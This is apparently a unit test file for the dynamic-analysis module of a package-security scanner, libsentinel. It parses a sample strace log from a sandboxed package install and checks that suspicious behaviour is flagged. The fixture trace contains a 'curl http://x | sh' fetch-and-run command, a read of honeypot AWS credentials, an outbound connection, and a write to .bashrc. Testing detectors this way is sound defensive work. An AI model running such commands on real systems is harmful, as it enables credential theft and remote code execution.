"""Блокові тести модуля dast: розбір журналу strace та обчислення B1–B3, К5."""

from libsentinel import dast
from libsentinel.models import Context, PackageVersion

INFO = {"home": "/home/sandbox", "venv": "/tmp/venv",
        "honeypots": ["/home/sandbox/.aws/credentials", "/home/sandbox/.ssh/id_rsa"]}

TRACE = """\
101 execve("/tmp/venv/bin/python", ["/tmp/venv/bin/python", "-m", "pip"], 0x7ffd /* 20 vars */) = 0
102 execve("/usr/bin/python3.12", ["python3.12", "setup.py"], 0x7 /* 20 vars */) = 0
102 openat(AT_FDCWD, "/home/sandbox/.aws/credentials", O_RDONLY|O_CLOEXEC) = 3
102 connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.10")}, 16 <unfinished ...>
103 execve("/bin/sh", ["sh", "-c", "curl http://x | sh"], 0x7 /* 20 vars */) = 0
102 <... connect resumed>) = -1 ENETUNREACH (Network is unreachable)
103 openat(AT_FDCWD, "/home/sandbox/.bashrc", O_WRONLY|O_CREAT|O_APPEND, 0666) = 3
104 openat(AT_FDCWD, "/tmp/build/x.o", O_WRONLY|O_CREAT, 0644) = 4
104 connect(5, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
105 execve("/usr/bin/gcc", ["gcc", "-c", "x.c"], 0x7 /* 20 vars */) = 0
"""


def test_parse_trace_resumed():
    ev = dast.parse_trace(TRACE, "install")
    conn = [e for e in ev if e.call == "connect"]
    assert len(conn) == 2
    assert "203.0.113.10" in conn[0].args and conn[0].ret == "-1"


def test_analyze_events(cfg):
    f = dast.analyze_events(dast.parse_trace(TRACE, "install"), INFO, cfg)
    assert [h for h, _, _ in f.connections] == ["203.0.113.10"]          # 127.0.0.1 дозволено
    assert [p for p, _ in f.honeypot_reads] == ["/home/sandbox/.aws/credentials"]
    assert [n for n, _, _ in f.programs] == ["sh"]                         # python, gcc дозволено
    assert [p for p, _ in f.writes] == ["/home/sandbox/.bashrc"]           # /tmp дозволено


def test_apply_findings(cfg):
    ctx = Context(name="d", old=PackageVersion("d", "1"), new=PackageVersion("d", "2"))
    f = dast.analyze_events(dast.parse_trace(TRACE, "install"), INFO, cfg)
    dast.apply_findings(ctx, f, {"install_rc": 0}, cfg)
    assert all(ctx.indicators[c].triggered for c in ("B1", "B2", "B3", "K5"))


def test_clean_trace(cfg):
    clean = "1 execve(\"/tmp/venv/bin/python\", [\"python\"], 0x0) = 0\n" \
            "1 openat(AT_FDCWD, \"/tmp/venv/lib/x.py\", O_WRONLY|O_CREAT, 0644) = 3\n"
    f = dast.analyze_events(dast.parse_trace(clean, "install"), INFO, cfg)
    assert not (f.connections or f.programs or f.writes or f.honeypot_reads)


def test_pick_archive_prefers_sdist(tmp_path):
    w = tmp_path / "a-1.0-py3-none-any.whl"
    s = tmp_path / "a-1.0.tar.gz"
    assert dast.pick_archive([w, s]) == s
    assert dast.pick_archive([w]) == w
